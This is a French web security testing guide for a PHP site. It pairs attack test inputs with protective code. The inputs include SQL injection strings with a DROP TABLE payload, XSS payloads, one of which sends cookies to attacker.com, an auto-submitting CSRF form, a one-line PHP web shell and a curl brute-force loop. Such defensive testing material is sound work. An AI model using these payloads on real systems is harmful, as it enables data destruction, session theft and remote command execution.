# 🔒 Guide de Test de Sécurité

## 🎯 Objectifs des tests de sécurité

### 1. Protection des données
- **Confidentialité** : Données protégées
- **Intégrité** : Données non modifiées
- **Disponibilité** : Accès autorisé uniquement
- **Authentification** : Vérification des identités

### 2. Vulnérabilités communes
- **Injection SQL** : Protection des requêtes
- **XSS** : Protection contre le code malveillant
- **CSRF** : Protection contre les attaques
- **Upload de fichiers** : Validation stricte

## 🛠️ Outils de test de sécurité

### 1. Outils gratuits
- **OWASP ZAP** : Scanner de vulnérabilités
- **Burp Suite Community** : Proxy de test
- **Nikto** : Scanner de serveur web
- **Nmap** : Scanner de ports

### 2. Outils payants
- **Burp Suite Professional** : Version complète
- **Acunetix** : Scanner automatique
- **AppScan** : Test d'applications
- **Nessus** : Scanner de vulnérabilités

## 📋 Tests de sécurité à effectuer

### 1. Test d'injection SQL

#### 1.1 Test de base
```sql
-- Test d'injection simple
' OR '1'='1
'; DROP TABLE cars; --
' UNION SELECT * FROM users --

-- Test dans les formulaires
Nom: ' OR '1'='1
Email: test@test.com' OR '1'='1
```

#### 1.2 Test avancé
```sql
-- Test de blind SQL injection
' AND (SELECT COUNT(*) FROM cars) > 0 --
' AND (SELECT LENGTH(password) FROM users LIMIT 1) = 8 --

-- Test de time-based injection
' AND (SELECT SLEEP(5) FROM users LIMIT 1) --
```

#### 1.3 Protection implémentée
```php
// Vérification de la protection
$stmt = $pdo->prepare("SELECT * FROM cars WHERE id = ?");
$stmt->execute([$id]); // Protection contre l'injection

// Test de la protection
$malicious_input = "'; DROP TABLE cars; --";
$stmt->execute([$malicious_input]); // Doit échouer proprement
```

### 2. Test XSS (Cross-Site Scripting)

#### 2.1 Test de base
```html
<!-- Test XSS simple -->
<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
<iframe src="javascript:alert('XSS')"></iframe>

<!-- Test dans les formulaires -->
Nom: <script>alert('XSS')</script>
Commentaire: <img src="x" onerror="alert('XSS')">
```

#### 2.2 Test avancé
```html
<!-- Test XSS persistant -->
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

<!-- Test XSS réfléchi -->
"><script>alert('XSS')</script>
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
```

#### 2.3 Protection implémentée
```php
// Vérification de la protection
function cleanInput($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    return $data;
}

// Test de la protection
$malicious_input = "<script>alert('XSS')</script>";
$cleaned = cleanInput($malicious_input);
// Doit retourner : &lt;script&gt;alert('XSS')&lt;/script&gt;
```

### 3. Test CSRF (Cross-Site Request Forgery)

#### 3.1 Test de base
```html
<!-- Page malveillante -->
<form action="https://votre-site.com/admin/action.php" method="POST">
    <input type="hidden" name="action" value="delete_user">
    <input type="hidden" name="user_id" value="1">
    <input type="submit" value="Cliquez ici pour gagner un iPhone">
</form>

<script>
    // Soumission automatique
    document.forms[0].submit();
</script>
```

#### 3.2 Protection implémentée
```php
// Vérification du token CSRF
session_start();
if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('Token CSRF invalide');
}

// Génération du token
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));
```

### 4. Test d'upload de fichiers

#### 4.1 Test de base
```bash
# Test d'upload de fichiers malveillants
# Créer un fichier PHP malveillant
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Tenter de l'uploader
# Doit être rejeté
```

#### 4.2 Test avancé
```bash
# Test de double extension
shell.php.jpg
shell.php.png
shell.php.gif

# Test de MIME type
# Changer l'extension d'un fichier PHP en .jpg
# Doit être détecté et rejeté
```

#### 4.3 Protection implémentée
```php
// Vérification de la protection
function validateFile($file) {
    // Vérification de l'extension
    $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    if (!in_array($extension, ['jpg', 'jpeg', 'png'])) {
        return false;
    }
    
    // Vérification du MIME type
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mimeType = finfo_file($finfo, $file['tmp_name']);
    finfo_close($finfo);
    
    $allowedMimes = ['image/jpeg', 'image/png'];
    if (!in_array($mimeType, $allowedMimes)) {
        return false;
    }
    
    return true;
}
```

### 5. Test d'authentification

#### 5.1 Test de force brute
```bash
# Script de test de force brute
for password in $(cat wordlist.txt); do
    curl -X POST https://votre-site.com/admin/login.php \
         -d "username=admin&password=$password"
done
```

#### 5.2 Protection implémentée
```php
// Vérification de la protection
session_start();

// Limitation des tentatives de connexion
if (isset($_SESSION['login_attempts']) && $_SESSION['login_attempts'] >= 5) {
    $lockout_time = 900; // 15 minutes
    if (time() - $_SESSION['last_attempt'] < $lockout_time) {
        die('Compte temporairement bloqué');
    }
    $_SESSION['login_attempts'] = 0;
}

// Vérification des identifiants
if ($username === ADMIN_USERNAME && password_verify($password, ADMIN_PASSWORD_HASH)) {
    $_SESSION['admin_logged_in'] = true;
    $_SESSION['login_attempts'] = 0;
} else {
    $_SESSION['login_attempts']++;
    $_SESSION['last_attempt'] = time();
}
```

### 6. Test de session

#### 6.1 Test de base
```php
// Test de fixation de session
// 1. Créer une session
// 2. Tenter de la réutiliser
// 3. Vérifier la régénération

// Test de timeout de session
// 1. Créer une session
// 2. Attendre le timeout
// 3. Vérifier la déconnexion
```

#### 6.2 Protection implémentée
```php
// Vérification de la protection
session_start();

// Régénération de l'ID de session
if (!isset($_SESSION['initialized'])) {
    session_regenerate_id(true);
    $_SESSION['initialized'] = true;
}

// Vérification du timeout
if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > 3600)) {
    session_unset();
    session_destroy();
    header('Location: login.php');
    exit;
}
$_SESSION['last_activity'] = time();
```

## 📊 Rapport de sécurité

### 1. Template de rapport
```markdown
# Rapport de Test de Sécurité
Date: [DATE]
Testeur: [NOM]
Version: [VERSION]

## Résumé exécutif
- Nombre de vulnérabilités trouvées: X
- Niveau de risque global: [FAIBLE/MOYEN/ÉLEVÉ/CRITIQUE]
- Recommandations prioritaires: X

## Vulnérabilités trouvées

### 1. [NOM DE LA VULNÉRABILITÉ]
- **Sévérité**: [CRITIQUE/ÉLEVÉE/MOYENNE/FAIBLE]
- **Description**: [DESCRIPTION]
- **Impact**: [IMPACT]
- **Recommandation**: [RECOMMANDATION]
- **Statut**: [OUVERTE/FERMÉE]

## Tests effectués
- [ ] Injection SQL
- [ ] XSS
- [ ] CSRF
- [ ] Upload de fichiers
- [ ] Authentification
- [ ] Gestion des sessions
- [ ] Autorisation
- [ ] Logs de sécurité

## Recommandations
1. [RECOMMANDATION PRIORITAIRE 1]
2. [RECOMMANDATION PRIORITAIRE 2]
3. [RECOMMANDATION PRIORITAIRE 3]
```

### 2. Métriques de sécurité
```yaml
# Métriques de sécurité
security_metrics:
  vulnerabilities:
    critical: 0
    high: 1
    medium: 2
    low: 3
  
  coverage:
    injection_tests: 100%
    xss_tests: 100%
    csrf_tests: 100%
    file_upload_tests: 100%
    authentication_tests: 100%
    session_tests: 100%
  
  compliance:
    owasp_top_10: 90%
    pci_dss: 85%
    gdpr: 95%
```

## 🚨 Gestion des vulnérabilités

### 1. Processus de correction
1. **Identification** : Vulnérabilité détectée
2. **Analyse** : Impact et cause
3. **Correction** : Développement de la solution
4. **Test** : Validation de la correction
5. **Déploiement** : Mise en production
6. **Vérification** : Test post-correction

### 2. Priorisation
- **P0** : Vulnérabilités critiques (correction immédiate)
- **P1** : Vulnérabilités élevées (correction < 24h)
- **P2** : Vulnérabilités moyennes (correction < 72h)
- **P3** : Vulnérabilités faibles (correction < 1 semaine)

### 3. Communication
```markdown
# Template de communication
Sujet: Vulnérabilité de sécurité détectée

Bonjour,

Une vulnérabilité de sécurité a été détectée sur le site.

**Détails**:
- Type: [TYPE]
- Sévérité: [SÉVÉRITÉ]
- Impact: [IMPACT]

**Actions**:
- [ ] Vulnérabilité corrigée
- [ ] Tests de validation effectués
- [ ] Déploiement en production

**Statut**: [EN COURS/RÉSOLU]

L'équipe technique
```

## 📋 Checklist de test de sécurité

- [ ] Tests d'injection SQL effectués
- [ ] Tests XSS effectués
- [ ] Tests CSRF effectués
- [ ] Tests d'upload de fichiers effectués
- [ ] Tests d'authentification effectués
- [ ] Tests de session effectués
- [ ] Tests d'autorisation effectués
- [ ] Tests de logs effectués
- [ ] Vulnérabilités documentées
- [ ] Corrections implémentées
- [ ] Tests de validation effectués
- [ ] Rapport final rédigé

## 🎯 Objectifs de sécurité

### Niveau actuel
- **Vulnérabilités critiques** : 0
- **Vulnérabilités élevées** : 0
- **Vulnérabilités moyennes** : < 2
- **Vulnérabilités faibles** : < 5

### Objectifs cibles
- **Vulnérabilités critiques** : 0
- **Vulnérabilités élevées** : 0
- **Vulnérabilités moyennes** : 0
- **Vulnérabilités faibles** : < 2

---

**La sécurité est un processus continu, pas un état ! 🔒**